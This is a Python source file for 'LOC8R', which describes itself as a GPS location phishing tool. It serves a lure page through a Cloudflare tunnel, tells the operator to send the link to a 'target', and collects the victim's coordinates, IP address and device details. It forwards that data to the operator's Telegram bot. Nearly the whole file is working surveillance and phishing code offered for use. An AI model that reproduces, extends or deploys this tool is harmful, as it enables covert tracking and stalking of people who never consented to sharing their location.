# 🛠️ AUTO DEPENDENCY INSTALLER
try:
    import flask, requests
    from waitress import serve
except:
    print("⏳ installing dependencies...\n")
    import os
    os.system("pip install -r req.txt > /dev/null 2>&1")
    os.execlp("python", "python", __file__)

# 🔰 ACTUAL TOOL STARTS HERE
import os
import time
import threading
import subprocess
from flask import Flask, request, render_template
import requests
from waitress import serve

CONFIG_FILE = '.TELEGRAM_CONFIG'

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    clear()
    print(f"""
\033[1;92m

██╗      ██████╗  ██████╗ █████╗ ██████╗ 
██║     ██╔═══██╗██╔════╝██╔══██╗██╔══██╗
██║     ██║   ██║██║     ╚█████╔╝██████╔╝
██║     ██║   ██║██║     ██╔══██╗██╔══██╗
███████╗╚██████╔╝╚██████╗╚█████╔╝██║  ██║
╚══════╝ ╚═════╝  ╚═════╝ ╚════╝ ╚═╝  ╚═╝
                                         
\033[1;91m╔═════════════════════════════════════════════╗
║ \033[1;97m🔥 LOC8R - GPS LOCATION PHISHING TOOL        \033[1;91m║
║ \033[1;97m📡 TRACK • TRAP • TRACE • TELEGRAM LINKED    \033[1;91m║
║ \033[1;97m🧠 DEVELOPED BY: NICK                        \033[1;91m║
╚═════════════════════════════════════════════╝
\033[0m
""")

def setup_telegram():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as file:
            lines = file.read().splitlines()
            if len(lines) >= 2:
                return lines[0], lines[1]
    bot_token = input("👉 ENTER YOUR BOT TOKEN: ").strip()
    chat_id = input("👉 ENTER YOUR CHAT ID: ").strip()
    with open(CONFIG_FILE, 'w') as file:
        file.write(bot_token + '\n' + chat_id)
    return bot_token, chat_id

def menu():
    print("\033[1;93m")
    print("""
[1] START TOOL
[2] ABOUT LOC8R
[3] EXIT
[4] RESET TELEGRAM CONFIG
""")
    choice = input(">> ENTER YOUR CHOICE: ").strip()
    if choice == '1':
        hosting_menu()
    elif choice == '2':
        print("\nLOC8R IS A GPS LOCATION PHISHING TOOL.\nIT USES TELEGRAM BOT TO SEND EXACT VICTIM LOCATION.")
        input("\nPRESS ENTER TO GO BACK...")
        main()
    elif choice == '3':
        exit()
    elif choice == '4':
        if os.path.exists(CONFIG_FILE):
            os.remove(CONFIG_FILE)
        time.sleep(1)
        main()
    else:
        main()

def hosting_menu():
    clear()
    print_banner()
    print("\033[1;95m")
    print("""
[1] LHOST (LOCALHOST)
[2] CLOUDFLARED
""")
    choice = input(">> SELECT HOSTING METHOD: ").strip()
    if choice == '1':
        start_lhost()
    elif choice == '2':
        start_cloudflared()
    else:
        main()

def send_to_telegram(token, chat_id, message):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    requests.get(url, params={'chat_id': chat_id, 'text': message})

def create_app(token, chat_id):
    app = Flask(__name__)

    @app.route('/')
    def index():
        return render_template('index.html')

    @app.route('/location', methods=['POST'])
    def location():
        data = request.get_json()
        lat = data.get('lat')
        lon = data.get('lon')

        user_agent = request.headers.get('User-Agent')
        ip = request.remote_addr

        if lat and lon:
            gmap = f"https://www.google.com/maps?q={lat},{lon}"
            msg = f"📍 LOCATION FOUND:\n{gmap}\n\n📱 DEVICE INFO:\n{user_agent}\n🌐 IP: {ip}"
            send_to_telegram(token, chat_id, msg)

            print("\n📍 NEW LOCATION RECEIVED:")
            print(f"🔗 Google Maps: {gmap}")
            print(f"🌐 IP: {ip}")
            print(f"📱 User-Agent: {user_agent}\n")

        return 'OK'

    @app.route('/done')
    def done():
        return '''
        <html><head><title>LOCATION CAPTURED</title>
        <style>
        body { background:#000; color:#0f0; font-family:monospace;
               display:flex; align-items:center; justify-content:center;
               height:100vh; flex-direction:column; }
        </style></head><body>
        <h1>📍 LOCATION RECEIVED</h1>
        <p>THANK YOU</p>
        </body></html>
        '''

    return app

def get_tunnel_url():
    import re
    proc = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", "http://localhost:8080", "--no-autoupdate"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )
    while True:
        line = proc.stdout.readline()
        if "https://" in line and "trycloudflare.com" in line:
            match = re.search(r"https://[^\s]+", line)
            if match:
                return match.group(0)

def start_lhost():
    clear()
    print_banner()
    with open(CONFIG_FILE, 'r') as f:
        lines = f.read().splitlines()
        token = lines[0]
        chat_id = lines[1]
    app = create_app(token, chat_id)

    print("📡 SEND THIS LINK TO TARGET: http://localhost:8080\n")
    threading.Thread(target=lambda: serve(app, host='0.0.0.0', port=8080), daemon=True).start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 SERVER STOPPED.")

def start_cloudflared():
    clear()
    print_banner()
    with open(CONFIG_FILE, 'r') as f:
        lines = f.read().splitlines()
        token = lines[0]
        chat_id = lines[1]
    app = create_app(token, chat_id)

    print("INSTALLING CLOUDFLARED PLS WAIT...\n")
    os.system("pkg install cloudflared -y > /dev/null 2>&1")

    threading.Thread(target=lambda: serve(app, host='0.0.0.0', port=8080), daemon=True).start()
    time.sleep(2)
    print("⏳ STARTING CLOUDFLARE TUNNEL...\n")
    link = get_tunnel_url()
    print(f"📡 SEND THIS LINK TO TARGET: [ {link} ]\n")
    print(f"🤖 BOT TOKEN: {token}")
    print(f"💬 CHAT ID  : {chat_id}\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 SERVER STOPPED.")

def main():
    print_banner()
    token, chat_id = setup_telegram()
    menu()

if __name__ == '__main__':
    main()